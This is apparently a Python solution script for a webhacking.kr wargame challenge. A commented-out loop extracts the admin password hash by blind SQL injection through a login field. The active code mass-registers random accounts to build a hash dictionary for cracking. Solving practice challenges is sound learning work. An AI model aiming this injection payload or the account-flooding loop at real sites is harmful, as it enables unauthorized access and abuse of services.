import requests
import string
import random

def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))


URL = "https://webhacking.kr/challenge/bonus-2/index.php"
SESSION_ID = "1"
cookies = {'PHPSESSID':SESSION_ID}
params ={'no':'2', 'id':'guest','pw':'guest'}
data = {'uuid':'', 'pw':'1'}

# find the hashed password for admin
# pw = ""
# i = len(pw)+1
# while True:
#     for c in "abcdef"+string.digits:

#         data['uuid'] = f"admin'&&left(pw,{i})like(0x{string_to_hex(pw+c)})#"
#         response = requests.post(URL, data=data, cookies=cookies)
#         print(c)
#         if "Wrong" in response.text:
#             pw += c
#             i += 1
#             print(pw)
#             break

# create dictionary for passwords and hashes
# Example usage
hash_admin = '6c9ca386a903921d7fa230ffa0ffc153'
params = {'mode':'join'}
output_file = open("hash_dictionary_old-22.txt", 'a')
# write hashed passwords to file
hashed_dict = {}
for i in range(1000000):

    random_username = generate_random_string(10)
    random_password = generate_random_string(10)
    data['uuid'] = random_username
    data['pw'] = random_password
    response = requests.post(URL, data=data,params=params, cookies=cookies)
    if "Done" in response.text:
        response = requests.post(URL, data=data, cookies=cookies)
        hashed_dict[random_password] = response.text.split("hash : ")[1].split("<br>")[0]
        # print(f"{random_password} : {hashed_dict[random_password]}")        
        output_file.write(f"{random_password} : {hashed_dict[random_password]}\n")        

output_file.close()